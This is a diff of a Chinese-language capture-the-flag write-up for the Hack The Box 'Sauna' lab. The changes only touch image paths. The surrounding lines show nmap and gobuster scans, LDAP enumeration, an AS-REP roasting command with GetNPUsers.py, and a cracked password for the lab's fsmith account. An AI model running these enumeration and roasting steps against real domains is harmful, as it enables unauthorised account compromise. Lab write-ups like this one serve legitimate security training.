@@ -20,7 +20,7 @@ nmap -sC -sV -p- -oA sauna 10.129.77.184 --open
 
 <figure><img src="../../.gitbook/assets/2 (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/4 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/4 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/3 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -30,11 +30,11 @@ nmap -sC -sV -p- -oA sauna 10.129.77.184 --open
 gobuster dir -u http://10.129.77.184/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-<figure><img src="../../.gitbook/assets/5 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/5 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * dirsearch也没有什么收获：
 
-<figure><img src="../../.gitbook/assets/6 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/6 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 使用多个工具尝试无密码登录SMB服务，倒是成功了，但是还是无收获：
 
@@ -82,13 +82,13 @@ ldapsearch -x -H LDAP://10.129.95.180 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub
 ./GetNPUsers.Py 'EGOTISTICAL-BANK.LOCAL/' -usersfile username.txt -format hashcat -outputfile hashes.aspro -dc-ip 10.129.95.180
 ```
 
-<figure><img src="../../.gitbook/assets/12 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/12 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 从这个hash中得知是fsmith这个账户的，破解该hash后获得明文密码：**Thestrokes23**
 
-<figure><img src="../../.gitbook/assets/13 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/13 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/14 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/14 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/15 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
